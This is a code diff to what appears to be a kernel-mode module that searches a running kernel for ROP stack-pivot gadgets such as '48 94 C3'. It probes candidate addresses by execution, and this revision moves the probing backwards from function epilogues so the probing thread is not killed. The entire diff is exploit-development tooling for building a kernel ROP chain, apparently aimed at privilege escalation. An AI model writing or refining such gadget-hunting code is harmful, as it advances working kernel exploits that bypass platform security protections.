@@ -21,11 +21,16 @@
  * v2.1 fix: func_list CANNOT go on stack — kernel thread stack may be small
  *   (4-8KB), and 4KB array + frame + asm clobber saves = instant overflow.
  *
+ * v3: EPILOGUE PROBING — probe backwards from function boundaries instead
+ *   of forwards from function starts. Function epilogues are safe (pop/ret),
+ *   while function bodies have hardware access, privileged ops, etc.
+ *   Pivot gadgets (48 94 C3, 50 5C C3, etc.) all end with C3 (ret),
+ *   and functions end with ret, so gadgets are at -3/-4 from ret.
+ *
  * Configure via -D flags:
  *   SCAN_BATCH:    which batch of the sorted pointer list to scan (0-based)
- *   BATCH_SIZE:    how many functions per batch (default 8)
- *   PROBE_DEPTH:   bytes to probe into each function body (default 128)
- *   PROBE_START:   first byte offset to probe within each function (default 1)
+ *   BATCH_SIZE:    how many function boundaries per batch (default 8)
+ *   PROBE_DEPTH:   bytes before each boundary to probe (default 16)
  *
  * Output layout (uint64_t indices):
  *   [0]  magic "SPVT" (0x53505654) | status(32)
@@ -53,10 +58,7 @@
 #define BATCH_SIZE     8
 #endif
 #ifndef PROBE_DEPTH
-#define PROBE_DEPTH    128
-#endif
-#ifndef PROBE_START
-#define PROBE_START    1   /* skip offset 0 (function entry = runs real code) */
+#define PROBE_DEPTH    16  /* bytes before each function boundary to probe */
 #endif
 
 #define MAGIC_SPVT     0x53505654  /* "SPVT" */
@@ -319,23 +321,41 @@ int module_start(kproc_args* args)
         int func_skipped = 0;
         int func_slot = HEADER_SLOTS + func_idx * 3;
 
-        /* Determine safe probe depth: don't go past next function */
-        int depth = PROBE_DEPTH;
-        if (fi + 1 < n_funcs) {
-            int64_t gap = func_list[fi + 1] - func_entry;
-            if (gap > 0 && gap < depth)
-                depth = (int)gap;
-        }
+        /* EPILOGUE PROBING: probe backwards from the NEXT function boundary.
+         *
+         * Why: probing forwards from function starts executes arbitrary
+         * mid-function code (hardware access, privileged ops) → thread death.
+         *
+         * Function epilogues are safe: they're just pop/ret sequences.
+         * The pivot gadgets we want (48 94 C3, 50 5C C3, etc.) all end
+         * with C3 (ret), and functions end with ret. So gadgets would be
+         * at offsets -3 or -4 from a function's final ret instruction.
+         *
+         * Probe: next_func - 1, next_func - 2, ..., next_func - depth
+         * where next_func - 1 is likely ret (C3) itself — extremely safe.
+         */
+        if (fi + 1 >= n_funcs)
+            continue;  /* no next function = can't determine boundary */
 
-        /* Record function entry */
+        uint64_t next_func = func_list[fi + 1];
+        int64_t gap = next_func - func_entry;
+        if (gap <= 0 || gap > 0x10000)
+            continue;  /* skip unreasonable gaps */
+
+        int depth = PROBE_DEPTH;
+        if (depth > (int)gap)
+            depth = (int)gap;
+
+        /* Record function entry (the boundary we're probing toward) */
         if (func_slot + 2 < 2304/8) {
-            out[func_slot + 0] = func_entry;
+            out[func_slot + 0] = next_func;  /* boundary address */
             out[func_slot + 1] = 0;
             out[func_slot + 2] = 0;
         }
 
-        for (int off = PROBE_START; off < depth; off++) {
-            uint64_t candidate = func_entry + off;
+        /* Probe backwards: off=1 means next_func-1, off=2 means next_func-2, etc. */
+        for (int off = 1; off <= depth; off++) {
+            uint64_t candidate = next_func - off;
 
             /* Check danger zone exclusion */
             if (is_dangerous(candidate, kdata_base)) {
@@ -450,7 +470,7 @@ int module_start(kproc_args* args)
             out[func_slot + 1] = (uint64_t)func_probed |
                                  ((uint64_t)func_survived << 16) |
                                  ((uint64_t)func_skipped << 32);
-            out[func_slot + 2] = (uint64_t)(depth - 1) |
+            out[func_slot + 2] = (uint64_t)depth |
                                  ((uint64_t)0x0001 << 32);
         }
     }
